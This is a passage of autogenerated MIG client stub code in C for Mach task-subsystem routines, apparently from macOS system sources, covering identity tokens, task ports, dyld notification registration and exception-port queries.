		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3453;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3453, "task_set_exc_guard_behavior")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3453, "task_set_exc_guard_behavior")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_exc_guard_behavior_t__defined)
	check_result = __MIG_check__Reply__task_set_exc_guard_behavior_t((__Reply__task_set_exc_guard_behavior_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_exc_guard_behavior_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_dyld_process_info_notify_register_t__defined)
#define __MIG_check__Reply__task_dyld_process_info_notify_register_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_dyld_process_info_notify_register_t(__Reply__task_dyld_process_info_notify_register_t *Out0P)
{

	typedef __Reply__task_dyld_process_info_notify_register_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3556) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_dyld_process_info_notify_register_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_dyld_process_info_notify_register */
mig_external kern_return_t task_dyld_process_info_notify_register
(
	task_read_t target_task,
	mach_port_t notify
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notify;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_dyld_process_info_notify_register_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_dyld_process_info_notify_register_t__defined */

	__DeclareSendRpc(3456, "task_dyld_process_info_notify_register")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t notifyTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->notify = notifyTemplate;
	InP->notify.name = notify;
#else	/* UseStaticTemplates */
	InP->notify.name = notify;
	InP->notify.disposition = 20;
	InP->notify.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3456;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3456, "task_dyld_process_info_notify_register")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3456, "task_dyld_process_info_notify_register")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_dyld_process_info_notify_register_t__defined)
	check_result = __MIG_check__Reply__task_dyld_process_info_notify_register_t((__Reply__task_dyld_process_info_notify_register_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_dyld_process_info_notify_register_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_create_identity_token_t__defined)
#define __MIG_check__Reply__task_create_identity_token_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_create_identity_token_t(__Reply__task_create_identity_token_t *Out0P)
{

	typedef __Reply__task_create_identity_token_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3557) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->token.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->token.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_create_identity_token_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_create_identity_token */
mig_external kern_return_t task_create_identity_token
(
	task_t task,
	task_id_token_t *token
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t token;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t token;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_create_identity_token_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_create_identity_token_t__defined */

	__DeclareSendRpc(3457, "task_create_identity_token")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3457;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3457, "task_create_identity_token")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3457, "task_create_identity_token")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_create_identity_token_t__defined)
	check_result = __MIG_check__Reply__task_create_identity_token_t((__Reply__task_create_identity_token_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_create_identity_token_t__defined) */

	*token = Out0P->token.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_identity_token_get_task_port_t__defined)
#define __MIG_check__Reply__task_identity_token_get_task_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_identity_token_get_task_port_t(__Reply__task_identity_token_get_task_port_t *Out0P)
{

	typedef __Reply__task_identity_token_get_task_port_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3558) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->task_port.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->task_port.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_identity_token_get_task_port_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_identity_token_get_task_port */
mig_external kern_return_t task_identity_token_get_task_port
(
	task_id_token_t token,
	task_flavor_t flavor,
	mach_port_t *task_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t task_port;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t task_port;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_identity_token_get_task_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_identity_token_get_task_port_t__defined */

	__DeclareSendRpc(3458, "task_identity_token_get_task_port")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = token;
	InP->Head.msgh_id = 3458;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3458, "task_identity_token_get_task_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3458, "task_identity_token_get_task_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_identity_token_get_task_port_t__defined)
	check_result = __MIG_check__Reply__task_identity_token_get_task_port_t((__Reply__task_identity_token_get_task_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_identity_token_get_task_port_t__defined) */

	*task_port = Out0P->task_port.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined)
#define __MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_dyld_process_info_notify_deregister_t(__Reply__task_dyld_process_info_notify_deregister_t *Out0P)
{

	typedef __Reply__task_dyld_process_info_notify_deregister_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3559) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_dyld_process_info_notify_deregister */
mig_external kern_return_t task_dyld_process_info_notify_deregister
(
	task_read_t target_task,
	mach_port_name_t notify
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_port_name_t notify;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined */

	__DeclareSendRpc(3459, "task_dyld_process_info_notify_deregister")

	InP->NDR = NDR_record;

	InP->notify = notify;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3459;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3459, "task_dyld_process_info_notify_deregister")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3459, "task_dyld_process_info_notify_deregister")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined)
	check_result = __MIG_check__Reply__task_dyld_process_info_notify_deregister_t((__Reply__task_dyld_process_info_notify_deregister_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_dyld_process_info_notify_deregister_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_exception_ports_info_t__defined)
#define __MIG_check__Reply__task_get_exception_ports_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_exception_ports_info_t(__Reply__task_get_exception_ports_info_t *Out0P, __Reply__task_get_exception_ports_info_t **Out1PP, __Reply__task_get_exception_ports_info_t **Out2PP, __Reply__task_get_exception_ports_info_t **Out3PP)
{

	typedef __Reply__task_get_exception_ports_info_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	__Reply *Out3P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3560) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 128);

	msgh_size_delta = Out0P->masksCnt * 8;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 8< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 8))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 256);

	msgh_size_delta = Out0P->masksCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out3PP = Out3P = (__Reply *) ((pointer_t) Out2P + msgh_size_delta - 128);

#if	__MigTypeCheck
	if ( Out0P->masksCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 640)) / 4< Out0P->masksCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 640) + Out0P->masksCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_exception_ports_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_exception_ports_info */
mig_external kern_return_t task_get_exception_ports_info
(
	mach_port_t port,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_info_array_t old_handlers_info,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;
	Reply *Out3P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_exception_ports_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_exception_ports_info_t__defined */

	__DeclareSendRpc(3460, "task_get_exception_ports_info")

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = port;
	InP->Head.msgh_id = 3460;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3460, "task_get_exception_ports_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3460, "task_get_exception_ports_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_exception_ports_info_t__defined)
	check_result = __MIG_check__Reply__task_get_exception_ports_info_t((__Reply__task_get_exception_ports_info_t *)Out0P, (__Reply__task_get_exception_ports_info_t **)&Out1P, (__Reply__task_get_exception_ports_info_t **)&Out2P, (__Reply__task_get_exception_ports_info_t **)&Out3P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_exception_ports_info_t__defined) */

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) masks, (const char *) Out0P->masks, 4 * Out0P->masksCnt);

	*masksCnt = Out0P->masksCnt;

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_handlers_info, (const char *) Out1P->old_handlers_info, 8 *  32);
		*masksCnt = Out0P->masksCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_handlers_info, (const char *) Out1P->old_handlers_info, 8 * Out0P->masksCnt);

	if (Out0P->masksCnt > 32) {
		(void)memcpy((char *) old_behaviors, (const char *) Out2P->old_behaviors, 4 *  32);
		*masksCnt = Out0P->masksCnt;
